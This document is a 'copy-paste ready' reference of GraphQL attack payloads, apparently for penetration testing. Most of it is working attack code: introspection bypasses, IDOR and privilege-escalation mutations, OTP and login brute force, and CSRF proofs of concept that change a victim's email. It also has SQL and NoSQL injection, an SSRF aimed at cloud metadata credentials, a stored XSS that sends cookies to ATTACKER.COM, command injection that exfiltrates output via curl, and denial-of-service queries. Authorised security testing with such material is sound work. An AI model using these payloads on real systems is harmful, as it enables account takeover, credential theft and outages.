# Payloads Reference

All payloads are copy-paste ready. Replace TARGET and placeholder values before use.

---

## Endpoint & Auth Probes

```bash
# Confirm GraphQL exists
curl -s -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__typename}"}' | jq .

# GET method test
curl -s "https://TARGET/graphql?query={__typename}"

# Form-encoded test
curl -s -X POST https://TARGET/graphql \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "query={__typename}"

# Authenticated
curl -s -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query":"{__typename}"}'
```

---

## Introspection Payloads

```json
// Minimal introspection probe
{"query":"{__schema{queryType{name}}}"}

// Bypass: newline injection
{"query":"{\n  __schema\n  {\n    queryType {\n      name\n    }\n  }\n}"}

// Bypass: GET method
// GET /graphql?query={__schema{queryType{name}}}

// Bypass: fragment trick
{"query":"query{...f} fragment f on Query{__schema{queryType{name}}}"}

// List all queries
{"query":"{__schema{queryType{fields{name description}}}}"}

// List all mutations
{"query":"{__schema{mutationType{fields{name description args{name type{name kind}}}}}}"}

// List all types
{"query":"{__schema{types{name kind description}}}"}

// Full introspection dump (use with InQL or GraphQL Voyager)
{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
```

---

## IDOR Payloads

```graphql
# Basic user IDOR
query { user(id: "2") { id email phone address role isAdmin } }

# IDOR via alias enumeration (1-10)
query {
  u1: user(id: "1") { id email role }
  u2: user(id: "2") { id email role }
  u3: user(id: "3") { id email role }
  u4: user(id: "4") { id email role }
  u5: user(id: "5") { id email role }
}

# Order IDOR
query { order(id: "1") { id status total user { email } items { name price } } }

# Mutation IDOR — update victim's data
mutation {
  updateUser(
    id: "VICTIM_ID"
    input: { email: "attacker@evil.com" }
  ) { user { id email } }
}

# Object traversal IDOR
query {
  me {
    organization {
      members { id email role isAdmin privateNotes }
      invoices { id amount status }
      apiKeys { name value }
    }
  }
}
```

---

## Auth Bypass Payloads

```graphql
# Admin mutation without privilege
mutation {
  updateUserRole(userId: "YOUR_ID", newRole: "ADMIN") {
    success
    user { id role }
  }
}

# Mass assignment during registration
mutation {
  createUser(input: {
    email: "test@test.com"
    password: "test1234"
    role: "ADMIN"
    isVerified: true
    isPremium: true
  }) { user { id email role isPremium } token }
}

# Unauthenticated admin query attempt
query {
  adminUsers { id email role lastLogin }
}

# Get system config (try unauthenticated)
query {
  systemSettings {
    smtpHost smtpUser smtpPassword
    jwtSecret
    databaseUrl
    s3Key s3Secret
  }
}
```

---

## Alias Brute Force Payloads

```graphql
# OTP brute force (first 20 codes — scale up)
mutation {
  a000000: verifyOTP(userId: "TARGET_ID", code: "000000") { success token }
  a000001: verifyOTP(userId: "TARGET_ID", code: "000001") { success token }
  a000002: verifyOTP(userId: "TARGET_ID", code: "000002") { success token }
  a123456: verifyOTP(userId: "TARGET_ID", code: "123456") { success token }
  a111111: verifyOTP(userId: "TARGET_ID", code: "111111") { success token }
  a000000: verifyOTP(userId: "TARGET_ID", code: "000000") { success token }
}

# Login brute force
mutation {
  a1: login(email: "admin@TARGET", password: "password") { token }
  a2: login(email: "admin@TARGET", password: "admin123") { token }
  a3: login(email: "admin@TARGET", password: "letmein") { token }
  a4: login(email: "admin@TARGET", password: "qwerty") { token }
  a5: login(email: "admin@TARGET", password: "123456") { token }
  a6: login(email: "admin@TARGET", password: "P@ssw0rd") { token }
  a7: login(email: "admin@TARGET", password: "Welcome1") { token }
  a8: login(email: "admin@TARGET", password: "Summer2024!") { token }
}
```

```bash
# Generate large alias brute force payload with Python
python3 << 'EOF'
passwords = open('/usr/share/wordlists/fasttrack.txt').readlines()[:500]
email = "admin@target.com"
print("mutation {")
for i, pwd in enumerate(passwords):
    pwd = pwd.strip().replace('"', '\\"')
    print(f'  a{i}: login(email: "{email}", password: "{pwd}") {{ token user {{ id email role }} }}')
print("}")
EOF
```

---

## CSRF Payloads

```bash
# CSRF via GET — paste in browser or send as link to victim
https://TARGET/graphql?query=mutation{changeEmail(newEmail:"attacker@evil.com"){success}}

# CSRF via curl simulating victim (for PoC only)
curl -s -X POST https://TARGET/graphql \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: session=VICTIM_SESSION" \
  -d 'query=mutation{changeEmail(newEmail:"attacker@evil.com"){success}}'
```

```html
<!-- CSRF HTML PoC — save as csrf.html, open in browser while logged into target -->
<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
<img src="https://TARGET/graphql?query=mutation{changeEmail(newEmail:%22attacker@evil.com%22){success}}">
<script>
fetch('https://TARGET/graphql', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'query=mutation{changeEmail(newEmail:"attacker@evil.com"){success}}'
}).then(r=>r.json()).then(d=>console.log(d));
</script>
</body>
</html>
```

---

## Injection Payloads

```graphql
# SQLi detection
query { users(filter: "'") { id } }
query { users(filter: "' OR '1'='1'-- -") { id email } }
query { users(filter: "1' AND SLEEP(5)-- -") { id } }

# NoSQLi (MongoDB operator injection via string)
query { user(email: "{\"$gt\":\"\"}") { id email role } }
mutation { login(email: "{\"$ne\":null}", password: "{\"$ne\":null}") { token } }

# SSRF
mutation { fetchUrl(url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/") { content } }
mutation { importData(url: "http://BURP_COLLABORATOR.oastify.com/ssrf") { result } }

# Stored XSS
mutation { createComment(content: "<script>fetch('https://ATTACKER.COM/?c='+document.cookie)</script>", postId: 1) { id } }
mutation { updateBio(bio: "<img src=x onerror=alert(document.cookie)>") { user { id bio } } }

# SSTI
mutation { updateProfile(name: "{{7*7}}") { user { name } } }
mutation { updateProfile(name: "${7*7}") { user { name } } }

# Command injection
mutation { ping(host: "127.0.0.1; id > /tmp/x #") { result } }
mutation { generateReport(name: "test; curl http://ATTACKER.COM/$(id|base64) #") { url } }
```

---

## DoS Payloads

```graphql
# Deep nesting DoS
query {
  user(id:1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                friends {
                  friends {
                    friends {
                      id email
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}

# Fragment cycling
fragment f on User { ...g }
fragment g on User { ...f }
query { user(id:1) { ...f } }

# Array batching DoS
[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]
# Scale to 1000+ entries
```

```bash
# Generate alias DoS payload
python3 -c "
print('query {')
for i in range(1000):
    print(f'  a{i}: user(id: 1) {{ id email role }}')
print('}')
" | curl -s -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d "{\"query\": \"$(cat | tr '\n' ' ')\"}"
```

---

## Clairvoyance & Schema Recovery

```bash
# Basic Clairvoyance run
clairvoyance https://TARGET/graphql -o schema.json

# Authenticated
clairvoyance https://TARGET/graphql \
  -H "Authorization: Bearer TOKEN" \
  -o schema.json

# With escape.tech wordlist (better coverage)
wget https://raw.githubusercontent.com/Escape-Technologies/graphql-wordlist/main/wordlist.txt
clairvoyance https://TARGET/graphql -w wordlist.txt -o schema.json

# Visualize result
# Open https://graphql-kit.com/graphql-voyager/
# Import schema.json

# graphw00f fingerprint
graphw00f -d -t https://TARGET/graphql

# graphql-cop audit
graphql-cop -t https://TARGET/graphql
graphql-cop -t https://TARGET/graphql -H "Authorization: Bearer TOKEN"
```

---

## Quick Full Test Flow (curl-based)

```bash
TARGET="https://target.com/graphql"
TOKEN="your_token_here"

echo "=== 1. Confirm GraphQL ==="
curl -s $TARGET -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__typename}"}' | jq .

echo "=== 2. Test introspection ==="
curl -s $TARGET -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{name}}}"}' | jq .

echo "=== 3. GET method ==="
curl -s "$TARGET?query={__typename}"

echo "=== 4. Form-encoded ==="
curl -s $TARGET -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  -d "query={__typename}"

echo "=== 5. Fingerprint ==="
curl -s $TARGET -X POST -H "Content-Type: application/json" \
  -d '{"query":"{thisFieldDoesNotExist}"}' | jq .errors

echo "=== 6. Authenticated introspection ==="
curl -s $TARGET -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{__schema{queryType{name}}}"}' | jq .
```
